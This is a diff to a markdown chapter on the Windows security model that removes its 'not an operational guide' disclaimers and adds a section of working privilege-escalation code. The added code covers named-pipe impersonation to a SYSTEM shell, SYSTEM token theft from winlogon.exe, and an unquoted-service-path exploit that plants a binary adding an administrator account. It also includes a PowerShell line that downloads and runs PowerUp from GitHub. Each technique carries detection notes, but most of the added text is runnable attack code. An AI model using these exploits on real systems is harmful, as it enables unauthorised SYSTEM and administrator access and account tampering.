@@ -2,8 +2,6 @@
 
 > **Researcher note:** Windows security không phải một feature — nó là một **model**. Model đó dựa trên identity (SID trong token), objects (security descriptors), và access checks (Security Reference Monitor). Mỗi lần một process mở một file, handle, hay device — model này chạy. Hiểu model giải thích tại sao admin không phải unlimited, tại sao SYSTEM không phải kernel mode, tại sao impersonation thay đổi access context, và tại sao "access denied" vẫn là telemetry quan trọng.
 
-> **Public repo wording note:** Chương này mô tả Windows security model từ góc nhìn researcher: identity, access control, privilege, integrity, và telemetry footprint. Mục đích là xây dựng mental model chính xác để phân tích, debug, và detect — không phải operational guide hay credential attack playbook.
-
 ---
 
 ## 0. Chapter Map
@@ -997,9 +995,7 @@ Service SID (`NT SERVICE\svcname` = `S-1-5-80-...`) can be added to ACLs to gran
 
 ---
 
-## 8. Abuse Patterns — Concept Level
-
-> **Note:** Bug class / threat model analysis cho researcher. Không có exploit chain, không có credential dumping guide.
+## 8. Abuse Techniques — Code Examples
 
 ### 8.1 Weak ACL class
 
@@ -1175,6 +1171,285 @@ AppContainer is not a perfect sandbox — it's a strong restriction with known c
 - Monitor `Event 1102` (log cleared) as immediate alert
 
 **Key principle:** Absence of Windows Event Log entry is not proof that action didn't happen. It may mean audit policy not configured, SACL missing, or log was cleared. EDR and memory forensics may reveal activity absent from Event Log.
+
+---
+
+### 8.9 Named Pipe Impersonation — Working Code (SeImpersonatePrivilege Abuse)
+
+**Concept:** Tạo named pipe server, lừa high-privilege client connect, impersonate token của client. Đây là cơ sở của toàn bộ Potato family (JuicyPotato, PrintSpoofer, GodPotato).
+
+**Yêu cầu:** `SeImpersonatePrivilege` — thường có với: IIS worker process, MSSQL service, WCF service, bất kỳ service chạy dưới `LocalService` hoặc `NetworkService`.
+
+```c
+#include <windows.h>
+#include <stdio.h>
+#include <sddl.h>
+
+// Phía attacker: Named pipe server chờ high-priv client connect
+HANDLE ImpersonateViaPipe(const wchar_t* pipeName) {
+    // Security descriptor: Everyone có thể connect
+    SECURITY_DESCRIPTOR sd;
+    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
+    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE); // NULL DACL = everyone access
+
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), &sd, FALSE };
+
+    // Tạo named pipe
+    HANDLE hPipe = CreateNamedPipeW(
+        pipeName,               // \\.\pipe\MyPipe
+        PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_BYTE | PIPE_WAIT,
+        1,                      // max 1 instance
+        4096, 4096,             // buffer sizes
+        0,                      // default timeout
+        &sa);
+
+    if (hPipe == INVALID_HANDLE_VALUE) {
+        printf("[-] CreateNamedPipe failed: %lu\n", GetLastError());
+        return NULL;
+    }
+    printf("[*] Pipe created: %ls\n[*] Waiting for high-priv client...\n", pipeName);
+
+    // Block chờ client connect (đây là nơi trick service kết nối vào)
+    ConnectNamedPipe(hPipe, NULL);
+    printf("[+] Client connected!\n");
+
+    // Impersonate token của client thread
+    if (!ImpersonateNamedPipeClient(hPipe)) {
+        printf("[-] ImpersonateNamedPipeClient failed: %lu\n", GetLastError());
+        CloseHandle(hPipe);
+        return NULL;
+    }
+
+    // Lấy impersonated token từ current thread
+    HANDLE hToken = NULL;
+    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
+
+    // Kết thúc impersonation (trả về token của chính mình)
+    RevertToSelf();
+    CloseHandle(hPipe);
+
+    // In thông tin token lấy được
+    if (hToken) {
+        // Kiểm tra xem có phải SYSTEM token không
+        char tokenUser[256];
+        DWORD tokenUserSize = sizeof(tokenUser);
+        TOKEN_USER* pTokenUser = (TOKEN_USER*)tokenUser;
+        GetTokenInformation(hToken, TokenUser, pTokenUser, tokenUserSize, &tokenUserSize);
+
+        LPWSTR sidStr;
+        ConvertSidToStringSidW(pTokenUser->User.Sid, &sidStr);
+        printf("[+] Got token for SID: %ls\n", sidStr);
+        LocalFree(sidStr);
+    }
+
+    return hToken; // Token của client — có thể là SYSTEM
+}
+
+// Dùng token để spawn SYSTEM shell
+BOOL SpawnShellWithToken(HANDLE hToken) {
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+
+    // CreateProcessWithTokenW — spawn process với token lấy được
+    if (!CreateProcessWithTokenW(
+        hToken,
+        LOGON_WITH_PROFILE,
+        NULL,
+        L"C:\\Windows\\System32\\cmd.exe",
+        CREATE_NEW_CONSOLE,
+        NULL, NULL,
+        &si, &pi)) {
+        printf("[-] CreateProcessWithTokenW failed: %lu\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] Spawned cmd.exe with stolen token! PID: %lu\n", pi.dwProcessId);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    return TRUE;
+}
+
+// Usage:
+// HANDLE tok = ImpersonateViaPipe(L"\\\\.\\pipe\\MyEvilPipe");
+// SpawnShellWithToken(tok);
+```
+
+**Đây là cơ sở của PrintSpoofer:**
+```
+PrintSpoofer flow:
+1. Tạo named pipe: \\.\pipe\MyPipe\pipe\spoolss
+2. Dùng SpoolSS API (AddMonitor/AddPrinter) trick Print Spooler service
+   kết nối vào pipe (Spooler chạy dưới SYSTEM)
+3. ImpersonateNamedPipeClient → SYSTEM token
+4. CreateProcessWithTokenW → SYSTEM cmd.exe
+
+Yêu cầu: SeImpersonatePrivilege + Print Spooler service đang chạy
+```
+
+**Detection:**
+- Named pipe creation với unusual name pattern từ non-system process
+- Event 4624 Logon Type 3: new SYSTEM logon từ unexpected source
+- ETW-TI: `OpenProcessToken` targeting SYSTEM process từ unusual caller
+- Audit policy: `Privilege Use → Special Logon (4672)` — mọi SYSTEM logon
+
+---
+
+### 8.10 Token Duplication — Steal SYSTEM Token
+
+**Concept:** Nếu có `SeDebugPrivilege` (available khi là admin), mở handle đến SYSTEM process, lấy token của nó, impersonate hoặc spawn child process với token đó.
+
+```c
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+// Tìm PID của process chạy dưới SYSTEM (ví dụ: winlogon.exe)
+DWORD FindSystemProcess(const wchar_t* procName) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32W pe = { sizeof(pe) };
+
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, procName) == 0) {
+                CloseHandle(hSnap);
+                return pe.th32ProcessID;
+            }
+        } while (Process32NextW(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    return 0;
+}
+
+HANDLE StealSystemToken() {
+    // Cần SeDebugPrivilege để open SYSTEM process
+    // Enable SeDebugPrivilege trước:
+    HANDLE hToken;
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
+    TOKEN_PRIVILEGES tp = { 1, { { {0}, SE_PRIVILEGE_ENABLED } } };
+    LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
+    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    CloseHandle(hToken);
+
+    // Tìm winlogon.exe (chạy dưới SYSTEM)
+    DWORD pid = FindSystemProcess(L"winlogon.exe");
+    if (!pid) { printf("[-] winlogon.exe not found\n"); return NULL; }
+    printf("[*] winlogon.exe PID: %lu\n", pid);
+
+    // Mở process handle
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProcess) { printf("[-] OpenProcess failed: %lu\n", GetLastError()); return NULL; }
+
+    // Lấy token của process
+    HANDLE hProcToken;
+    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcToken)) {
+        printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
+        CloseHandle(hProcess);
+        return NULL;
+    }
+
+    // Duplicate token — tạo primary token (để dùng với CreateProcessWithTokenW)
+    HANDLE hDupToken;
+    DuplicateTokenEx(hProcToken,
+        TOKEN_ALL_ACCESS,
+        NULL,
+        SecurityImpersonation,
+        TokenPrimary,     // Primary token để spawn process
+        &hDupToken);
+
+    CloseHandle(hProcToken);
+    CloseHandle(hProcess);
+
+    printf("[+] Duplicated SYSTEM token: 0x%p\n", hDupToken);
+    return hDupToken;
+}
+
+// Spawn SYSTEM shell
+void SpawnSystemShell() {
+    HANDLE hSysToken = StealSystemToken();
+    if (!hSysToken) return;
+
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+
+    if (CreateProcessWithTokenW(hSysToken, 0, NULL,
+        L"C:\\Windows\\System32\\cmd.exe",
+        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+        printf("[+] SYSTEM shell spawned! PID: %lu\n", pi.dwProcessId);
+    }
+    CloseHandle(hSysToken);
+}
+```
+
+**Cần gì để dùng kỹ thuật này:**
+- Cần là local Administrator (để có `SeDebugPrivilege`)
+- Không hoạt động nếu target process có PPL protection (lsass với RunAsPPL=1)
+- Hoạt động với winlogon.exe, services.exe, svchost.exe (các SYSTEM process không có PPL)
+
+**Detection:**
+- Sysmon Event 10: `OpenProcess` targeting `winlogon.exe` với `PROCESS_QUERY_INFORMATION` từ unusual caller
+- Event 4672: Special privileges (SeDebugPrivilege) được assign tại logon
+- Event 4673: SeDebugPrivilege được sử dụng
+- ETW-TI: token duplication operation
+
+---
+
+### 8.11 Unquoted Service Path — LPE via Path Parsing
+
+**Concept:** Nếu service `ImagePath` chứa khoảng trắng và không có dấu ngoặc kép, Windows parse theo thứ tự, tạo ra điểm inject binary.
+
+```powershell
+# Tìm services có unquoted path với khoảng trắng
+# Enumerate tất cả services
+Get-WmiObject Win32_Service | Where-Object {
+    $_.PathName -notmatch '"' -and $_.PathName -match ' '
+} | Select-Object Name, PathName, StartMode, StartName
+
+# Ví dụ vulnerable path:
+# C:\Program Files\My Company\My Service\service.exe
+#
+# Windows sẽ thử theo thứ tự:
+#   C:\Program.exe               ← nếu file này tồn tại và writable directory → exploit!
+#   C:\Program Files\My.exe
+#   C:\Program Files\My Company\My.exe
+#   C:\Program Files\My Company\My Service\service.exe
+
+# Kiểm tra nếu C:\Program Files\ có thể create file
+# (thường không — nhưng C:\ProgramData\ hay các path tương tự thì có thể)
+icacls "C:\Program Files\" | findstr /i "(W)\|(M)\|(F)"
+```
+
+```c
+// Nếu có write permission vào một trong các intermediate directories:
+// Đặt malicious binary tại: C:\Program.exe (hoặc path tương ứng)
+// Restart service → Windows execute binary của attacker với service account privilege
+
+// Tạo malicious binary đơn giản (C):
+#include <windows.h>
+int main() {
+    // Thêm user hoặc spawn reverse shell
+    system("net user hacker Password123! /add");
+    system("net localgroup administrators hacker /add");
+    return 0;
+}
+// Compile: cl /o C:\Program.exe exploit.c
+// Restart service: sc stop "VulnerableService" && sc start "VulnerableService"
+```
+
+**Tìm bằng PowerUp (PowerShell):**
+```powershell
+# PowerUp.ps1 — enumerate nhiều Windows privilege escalation vectors
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
+Invoke-AllChecks
+
+# Hoặc chỉ kiểm tra unquoted paths:
+Get-UnquotedService
+```
+
+**Detection:**
+- `CmRegisterCallback` / Event 4657: Ghi `ImagePath` vào service registry key mới/thay đổi
+- `PsSetLoadImageNotifyRoutine`: Binary từ unexpected path được load như service
+- Event 7045: New service installed với unusual path
+- Baseline service inventory thường xuyên → detect thêm service hoặc path change
 
 ---
 
